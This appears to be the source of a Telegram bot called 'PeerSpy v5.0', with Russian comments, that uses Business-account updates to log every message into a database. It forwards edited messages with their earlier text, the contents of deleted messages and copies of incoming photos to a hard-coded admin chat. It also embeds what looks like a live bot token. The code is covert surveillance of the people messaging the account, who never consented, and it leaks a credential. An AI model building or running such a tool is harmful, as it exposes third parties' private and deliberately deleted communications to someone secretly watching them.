import os
import asyncio
import aiohttp
import logging
import sqlite3
from flask import Flask
from threading import Thread
from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command

# --- КОНФИГ ---
TOKEN = "8758417597:AAGJgDZWLjjfsF0YL9hHQDLCGkcgOVO5Q1o"
ADMIN_ID = 6451702799 

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    # Добавляем поле для даты, чтобы логи были понятнее
    cur.execute('''CREATE TABLE IF NOT EXISTS messages (msg_id TEXT PRIMARY KEY, text TEXT, user_id TEXT)''')
    conn.commit()
    conn.close()

app = Flask('')
@app.route('/')
def home(): return "PeerSpy Engine v5.0 Active"

def run_web():
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# --- ФУНКЦИЯ СОХРАНЕНИЯ ФОТО (ВЫНЕСЕНА ОТДЕЛЬНО) ---
async def save_photo(message: types.Message):
    if message.photo:
        f_id = message.photo[-1].file_id
        file = await bot.get_file(f_id)
        file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file.file_path}"
        async with aiohttp.ClientSession() as session:
            async with session.get(file_url) as resp:
                if resp.status == 200:
                    content = await resp.read()
                    await bot.send_photo(ADMIN_ID, types.BufferedInputFile(content, filename="spy.jpg"), 
                                         caption=f"📸 <b>ФОТО ПЕРЕХВАЧЕНО</b>\nОт: <code>{message.from_user.id}</code>")

# --- УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК ВСЕГО ---
@dp.update()
async def main_handler(update: types.Update):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    
    # ПРОВЕРКА: Это сообщение (обычное или бизнес)
    msg = update.message or update.business_message or update.edited_message or update.edited_business_message
    
    if msg:
        m_id = str(msg.message_id)
        txt = msg.text or msg.caption or "[Медиа/Стикер]"
        
        # Если это правка
        if update.edited_message or update.edited_business_message:
            cur.execute("SELECT text FROM messages WHERE msg_id=?", (m_id,))
            old = cur.fetchone()
            if old and old[0] != txt:
                await bot.send_message(ADMIN_ID, f"📝 <b>ПРАВКА:</b>\n\n<b>Было:</b> {old[0]}\n<b>Стало:</b> {txt}")
        
        # Сохраняем/Обновляем в базе
        cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", (m_id, txt, str(msg.from_user.id)))
        conn.commit()

        # Если в сообщении есть фото — сохраняем
        if msg.photo:
            await save_photo(msg)

    # ПРОВЕРКА: Это удаление (бизнес)
    elif update.business_deleted_messages:
        for m_id in update.business_deleted_messages.message_ids:
            cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(m_id),))
            res = cur.fetchone()
            if res:
                await bot.send_message(ADMIN_ID, f"🗑 <b>УДАЛЕНО:</b>\n\n<code>{res[0]}</code>")

    conn.close()

@dp.message(Command("start"))
async def start(m: types.Message):
    await m.answer("🚀 <b>PeerSpy v5.0 Запущен!</b>\nТеперь я слушаю все типы сообщений.")

async def main():
    init_db()
    Thread(target=run_web).start()
    # Форсируем получение ВСЕХ типов обновлений
    await dp.start_polling(bot, allowed_updates=["message", "edited_message", "business_message", "edited_business_message", "business_deleted_messages"])

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
